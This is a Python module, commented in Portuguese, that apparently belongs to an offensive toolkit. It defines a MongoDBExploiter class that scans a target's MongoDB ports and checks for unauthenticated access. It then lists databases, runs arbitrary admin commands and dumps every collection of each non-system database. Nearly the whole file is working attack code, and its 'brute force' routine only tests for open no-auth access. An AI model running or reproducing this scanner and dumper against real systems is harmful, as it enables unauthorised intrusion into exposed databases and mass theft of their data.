# modules/database/mongodb.py
import pymongo
import socket
from concurrent.futures import ThreadPoolExecutor

class MongoDBExploiter:
    def __init__(self):
        self.common_ports = [27017, 27018, 27019]
        self.common_databases = ['admin', 'test', 'local', 'config']

    def connect_mongodb(self, target, port=27017, username=None, password=None, timeout=5):
        """Tenta conexão MongoDB"""
        try:
            if username and password:
                conn_str = f"mongodb://{username}:{password}@{target}:{port}/"
            else:
                conn_str = f"mongodb://{target}:{port}/"
            
            client = pymongo.MongoClient(conn_str, serverSelectionTimeoutMS=timeout*1000)
            client.server_info()  # Testa conexão
            return client
        except:
            return None

    def check_noauth(self, target, port=27017):
        """Verifica se MongoDB permite acesso sem autenticação"""
        try:
            client = self.connect_mongodb(target, port)
            if client:
                # Lista databases
                databases = client.list_database_names()
                client.close()
                return True, databases
        except:
            pass
        return False, []

    def brute_force_mongodb(self, target, port=27017):
        """Força bruta MongoDB"""
        # MongoDB geralmente não tem brute force tradicional como SQL
        # Verificamos acesso sem autenticação primeiro
        print("[+] Verificando acesso sem autenticação...")
        
        noauth, databases = self.check_noauth(target, port)
        if noauth:
            return [('noauth', '', databases)]
        
        return []

    def get_mongodb_info(self, target, port, username=None, password=None):
        """Obtém informações do MongoDB"""
        info = {}
        client = self.connect_mongodb(target, port, username, password)
        
        if client:
            try:
                # Informações do servidor
                server_info = client.server_info()
                info['version'] = server_info.get('version', 'Unknown')
                info['host'] = server_info.get('host', 'Unknown')
                
                # Databases
                info['databases'] = client.list_database_names()
                
                # Estatísticas
                info['stats'] = client.admin.command('dbStats')
                
            except Exception as e:
                info['error'] = str(e)
            finally:
                client.close()
        
        return info

    def execute_command(self, target, port, username, password, command):
        """Executa comando MongoDB"""
        client = self.connect_mongodb(target, port, username, password)
        if not client:
            return None
        
        try:
            # Comando no admin database
            result = client.admin.command(command)
            client.close()
            return result
            
        except Exception as e:
            return f"Erro: {str(e)}"

    def dump_database(self, target, port, username, password, database):
        """Faz dump de database específico"""
        client = self.connect_mongodb(target, port, username, password)
        if not client:
            return None
        
        try:
            db = client[database]
            collections = db.list_collection_names()
            
            dump_data = {}
            for collection in collections:
                try:
                    data = list(db[collection].find())
                    dump_data[collection] = data
                except:
                    continue
            
            client.close()
            return dump_data
            
        except Exception as e:
            return f"Erro: {str(e)}"

    def check_vulnerabilities(self, target, port):
        """Verifica vulnerabilidades comuns do MongoDB"""
        vulns = []
        
        # Verifica se permite acesso sem autenticação
        noauth, _ = self.check_noauth(target, port)
        if noauth:
            vulns.append("Acesso sem autenticação permitido")
        
        return vulns

    def scan_mongodb(self, target):
        """Scan completo MongoDB"""
        print(f"[+] Scan MongoDB em: {target}")
        
        results = {
            'credentials': [],
            'info': {},
            'vulnerabilities': [],
            'databases': []
        }
        
        # Verifica portas MongoDB comuns
        for port in self.common_ports:
            print(f"  [+] Testando porta {port}...")
            
            # Força bruta
            creds = self.brute_force_mongodb(target, port)
            results['credentials'].extend(creds)
            
            # Se tiver acesso, obtém mais informações
            if creds:
                auth_type, username, password = creds[0]
                results['info'] = self.get_mongodb_info(target, port, username, password)
                
                # Verifica vulnerabilidades
                results['vulnerabilities'] = self.check_vulnerabilities(target, port)
                
                # Tenta dump de databases
                if 'databases' in results['info']:
                    for db in results['info']['databases']:
                        if db not in ['admin', 'local', 'config']:
                            print(f"    [+] Dump database: {db}")
                            dump = self.dump_database(target, port, username, password, db)
                            if dump and isinstance(dump, dict):
                                results['databases'].append({db: dump})
        
        return results